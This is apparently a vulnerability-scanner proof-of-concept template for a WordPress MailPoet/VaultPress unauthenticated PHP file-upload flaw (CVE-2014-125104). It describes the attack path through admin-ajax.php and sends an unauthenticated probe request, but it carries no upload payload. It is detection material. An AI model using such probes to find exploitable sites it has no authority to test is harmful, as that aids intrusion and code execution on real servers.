[info]
id = "POC-AVE-2014-0004"
name = "WordPress VaultPress MailPoet 未授权文件上传 PoC"
author = "AVE"
severity = "critical"
tags = ["cve-2014-125104", "wordpress", "vaultpress", "mailpoet", "wysija", "file-upload", "cwe-434"]
description = "WordPress VaultPress 插件 (≤1.6.0) 中 protect_aioseo_ajax 函数存在权限绕过，结合 MailPoet (wysija-newsletters ≤2.6.6) AJAX 文件上传处理程序未做身份验证检查。未经身份验证的攻击者可通过 wp-admin/admin-ajax.php 的 wysija_ajax action 上传恶意 PHP 文件，导致任意代码执行。"
vuln_id = ["CVE-2014-125104", "AVE-2014-0004"]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/wp-admin/admin-ajax.php"

headers.Content-Type = "application/x-www-form-urlencoded"
headers.X-Requested-With = "XMLHttpRequest"

body.type = "form"
body.action = "wysija_ajax"
body.controller = "campaign"
body.task = "get_lists"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["lists"]
expect = true
